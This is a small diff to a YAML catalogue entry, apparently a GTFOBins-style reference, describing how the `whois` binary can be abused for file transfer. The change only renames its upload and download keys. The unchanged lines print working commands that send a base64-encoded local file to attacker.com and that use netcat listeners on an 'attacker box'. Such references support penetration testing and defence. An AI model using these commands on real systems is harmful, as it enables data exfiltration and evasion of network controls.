@@ -2,7 +2,7 @@
 description: |
   `whois` hangs waiting for the remote peer to close the socket.
 functions:
-  upload:
+  file-upload:
     - description: Send a text file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments.
       code: |
         RHOST=attacker.com
@@ -15,7 +15,7 @@ functions:
         RPORT=12345
         LFILE=file_to_send
         whois -h $RHOST -p $RPORT "`base64 $LFILE`"
-  download:
+  file-download:
     - description: Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped.
       code: |
         RHOST=attacker.com
